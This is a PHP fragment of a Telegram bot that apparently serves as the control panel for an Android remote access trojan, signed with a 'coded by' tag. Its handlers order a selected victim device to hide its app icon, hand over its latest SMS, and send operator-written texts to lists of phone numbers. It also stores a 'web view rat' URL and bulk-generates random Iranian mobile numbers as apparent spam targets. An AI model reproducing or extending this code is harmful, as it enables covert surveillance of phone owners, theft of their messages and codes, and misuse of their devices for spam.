   sm($chat_id,"{☎️} 𝑬𝒏𝒕𝒆𝒓 𝒚𝒐𝒖𝒓 𝒏𝒖𝒎𝒃𝒆𝒓 𝒍𝒊𝒔𝒕 : 

{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲  $crd ",$back4);
}
   elseif($data == 'eddiittxt'){
   	
   file_put_contents("admins","message");
   sm($chat_id,"{⌨} 𝑬𝒏𝒕𝒆𝒓 𝒚𝒐𝒖𝒓 𝑻𝒆𝒙𝒕 :

{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲  $crd ",$back4);
   
	

    }
    
	elseif($data == 'iconhidee'){
		     em($chat_id,$mi,"{🕯} 𝑹𝒆𝒒𝒖𝒆𝒔𝒕 𝑯𝒊𝒅𝒆-𝒊𝒄𝒐𝒏 𝒔𝒆𝒏𝒅𝒆𝒅 𝒕𝒐 𝒖𝒔𝒆𝒓.
	
 𝑷𝒍𝒆𝒂𝒔𝒆 𝒘𝒂𝒊𝒕.. 
 
{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲  $crd ",$admins);
	  $androidid=file_get_contents('p');  
action('hideicon',$androidid);
   $name=file_get_contents('name');  

	       
  
 
    
	    
	  
	    
	    
	}elseif($data == 'laastssms'){
		em($chat_id,$mi,"{💌} 𝑹𝒆𝒒𝒖𝒆𝒔𝒕 𝒍𝒂𝒔𝒕 𝒔𝒎𝒔 𝒔𝒆𝒏𝒅𝒆𝒅 𝒕𝒐 𝒖𝒔𝒆𝒓.
	
 𝑷𝒍𝒆𝒂𝒔𝒆 𝒘𝒂𝒊𝒕.. 
 
{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲  $crd ",$admins);
	  $androidid=file_get_contents('p');  
action('lastsms',$androidid);
   $name=file_get_contents('name');  
     
	       

	}elseif($adminact == "message" ){
        file_put_contents('mess',$text);
        
        $nump=file_get_contents("nump");
        
        	    sm($chat_id,"{☎️} 𝑬𝒏𝒕𝒆𝒓 𝒚𝒐𝒖𝒓 𝒏𝒖𝒎𝒃𝒆𝒓 𝒍𝒊𝒔𝒕 :

{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲  $crd ",$back4);
        
         file_put_contents("admins","message1");
    }elseif($adminact == "message1" ){
    	sm($chat_id,"{📧} 𝑹𝒆𝒒𝒖𝒆𝒔𝒕 𝒔𝒆𝒏𝒅-𝒔𝒎𝒔 𝒔𝒆𝒏𝒅𝒆𝒅 𝒕𝒐 𝒖𝒔𝒆𝒓.
 
{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲  $crd ",$admins);   	    
file_put_contents("admins","");
        file_put_contents('nump',$text);
        $nump=file_get_contents("nump");
       $androidid=file_get_contents('p');  
	  $messs=  file_get_contents("mess");
 $data = file_get_contents('nump');
    $str = explode("\n", $data); 
    foreach ($str as $str1) {
        
  sendmess("SendSingleMessage",$androidid,$str1,$messs);
       
    
    } 
     file_put_contents("nump","");

	    
	
		
		}elseif($adminact=="setdom"){
			file_put_contents("id.txt",$text);
			
			sm($chat_id,"{🔗} 𝑈𝑅𝐿 𝑤𝑒𝑏 𝑣𝑖𝑒𝑤 𝑟𝑎𝑡 𝑠𝑒𝑡𝑒𝑑

𝘆𝗼𝘂𝗿 𝘄𝗲𝗯 ~ $text {🍷}

{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲 $crd 
",$starta);
file_put_contents("admins","");
}
	    if(strpos($text, "/set_") !== false){
    $code = str_replace("/set_", null, $text);
file_put_contents("p",$code);

        sm($chat_id,"{👍🏿️} 𝐴𝑛𝑑𝑟𝑜𝑖𝑑 𝐼𝐷 $code 𝑠𝑒𝑡𝑒𝑑",$admins);


	}elseif($adminact=="setuser"){
	    //strlen($text) == 16 and
	    if( strpos(file_get_contents("user.txt"),$text) !== false){
	        
	    file_put_contents("p",$text);
	sm($chat_id,"{👍🏿} 𝐴𝑛𝑑𝑟𝑜𝑖𝑑 𝐼𝐷 $text 𝑠𝑒𝑡𝑒𝑑",$admins);
	     
	  
	     file_put_contents("admins","");
	    }else{
	        
	        
	            sm($chat_id,"{👎🏿} ᴡᴏʀɴɢ ᴀɴᴅʀᴏɪᴅ ɪᴅ ",$starta);
	file_put_contents("admins","");
	
	        
	        }
	            
  
	
	
}

}



function generateNum(){
    $rangs = ["0933", "0912", "0922", "0991", "0992", "0993", "0994", "0911", "0912", "0913", "0914", "0916", "0930", "0935", "0936", "0905", "0904", "0938", "0939", "0937", "0938", "0919", "0901", "0902", "0903", "0990", "0921", "0919", "0918", "0917", "0900"];
    $num = $rangs[array_rand($rangs)] . rand(1000000, 9999999);
    return $num;
  }
    if($data == 'leacher'){
    if(is_file('files/num.txt')) {
      unlink('files/num.txt');
    }
    for($i=0;$i < 40;$i++){
      $num = file_get_contents('files/num.txt');
      file_put_contents('files/num.txt' , $num . PHP_EOL . generateNum());
    }
    $lecher = file_get_contents('files/num.txt');
    em($chat_id,$mi,"{🕳} 𝑵𝒖𝒎𝒃𝒆𝒓 𝒍𝒆𝒂𝒄𝒉𝒆𝒅 : 
    
<code>$lecher</code>

{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲  $crd",$starta);
   
  }
	       
if($adminact == "autos" ){
    if(is_file('num')) {
      unlink('p');
    }
    for($i=0;$i < 30;$i++){
      $num = file_get_contents('p');
      file_put_contents('p' , $num . PHP_EOL . generateNum());
    }
    $lecher = file_get_contents('files/num.txt');
    sm($chat_id,"{🕳} 𝑵𝒖𝒎𝒃𝒆𝒓 𝒍𝒆𝒂𝒄𝒉𝒆𝒅 : 
    
<code>$lecher</code>

{👺} 𝐜𝐨𝐝𝐞𝐝 𝐛𝐲  $crd",$starta);
   
  }
  ?>
        
    






